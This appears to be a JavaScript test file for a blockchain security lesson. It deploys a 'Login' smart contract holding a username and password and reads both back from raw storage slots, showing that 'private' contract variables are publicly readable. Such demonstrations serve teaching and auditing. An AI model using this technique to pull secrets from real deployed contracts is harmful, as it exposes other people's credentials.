const {ethers} = require("hardhat");
const {expect} = require("chai");
const { login } = require("near-cli");

describe("Attack", function (){

    it("Should be able to read private variable password and username", async function(){
        
        //Deploy login contract
        const loginFactory = await ethers.getContractFactory("Login");

        //Converting string to byte32 array to save space
        const usernameBytes = ethers.utils.formatBytes32String("test");
        const passwordBytes = ethers.utils.formatBytes32String("password");

        //Deploying the contract
        const loginContract = await loginFactory.deploy(usernameBytes,passwordBytes);
        await loginContract.deployed();

        //Get storage at slot 0,1
        const slot0byte = await ethers.provider.getStorageAt(loginContract.address, 0);
        const slot1byte = await ethers.provider.getStorageAt(loginContract.address, 1);

        //The extracted value should be equal to passed value
        expect(ethers.utils.parseBytes32String(slot0byte)).to.equal("test");
        expect(ethers.utils.parseBytes32String(slot1byte)).to.equal("password");
    
    });

});